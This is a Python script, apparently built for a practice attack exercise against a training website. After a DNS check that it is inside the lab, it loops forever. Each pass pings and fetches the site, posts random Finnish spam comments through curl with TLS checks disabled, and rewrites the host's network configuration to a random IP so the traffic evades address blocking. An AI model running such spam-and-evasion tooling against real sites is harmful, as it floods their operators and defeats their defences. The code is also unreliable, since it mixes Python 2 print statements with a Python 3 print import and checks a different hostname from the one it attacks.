# coding=utf-8
from __future__ import print_function
import time
import socket
import sys
from subprocess import call
from random import randint

# We need to check if we are in the test environment before launching any attacks

print "checking if you are in the practise environment"
try:
    test = socket.gethostbyname('www.datacentre.fi')
except:
    print "failed to resolve, you might not be in the practise environment"
    print "exiting"
    sys.exit()
if test != "37.47.255.10":
    print "www.datacentre.fi didn't resolve to the right address, you might not"
    print "be in the test environment"
    sys.exit()
    
print "success!"

lauseet = ["Erittäin+hieno+ja+turvallinen+saitti,+kiitos+teille+tästä",
"Hahaa+olen+spam+monsteri+spammi+poika+pistää+XDDDD",
"Olen+jymy+juntunen+T:+jymyjuntunen",
"Datasentteri+on+kyllä+hyvä+paikka+laittaa+omia+datojaan+kyllä+kyllä",
"Olen+kommentoija+ja+kommentoin+tähän+kommenttipalstalle+hihii",
"Ei+sitä+ihan+joka+paikassa+näin+hienoa+saittia+ole+värit+on+kohallaaan+kiitos"]


def writeComment():
    position = randint(0,5)
    stringval = "https://89.250.48.10/tallenna.php?merkinta=" + lauseet[position] +"&nappi=Tallenna"
    call(["curl", "-k", stringval])

def sendPing():
    call(["ping", "www.datacenter.fi", "-c 5"])

def curlPage():
    site = "https://www.datacenter.fi/tallenna.php"
    call(["curl", "-k", site])

def swapAddress():
    netconfig = """
    auto lo
    iface lo inet loopback

    allow-hotplug enp0s3
    iface enp0s3 inet static
        address 31.7.16.""" + str(randint(2,200)) + """
        netmask 255.255.255.0
        gateway 31.7.16.1
        dns-nameservers 195.20.4.10
    """
    print("writing new configuration to file...")
    f = open("/etc/network/interfaces", "w")
    print(netconfig, file=f)
    f.close()
    print("flushing interface...")
    call(["ip", "addr", "flush", "dev", "enp0s3"])
    print("taking interface down...")
    call(["ifdown", "enp0s3"])
    print("bringing interface back up")
    call(["ifup", "enp0s3"])
    print("done, sleeping(15)...")
    time.sleep(15)

while True:
    print("pinging...")
    sendPing()
    print("curling...")
    curlPage()
    print("writing a comment...")
    writeComment()
    print("swapping address...")
    swapAddress()
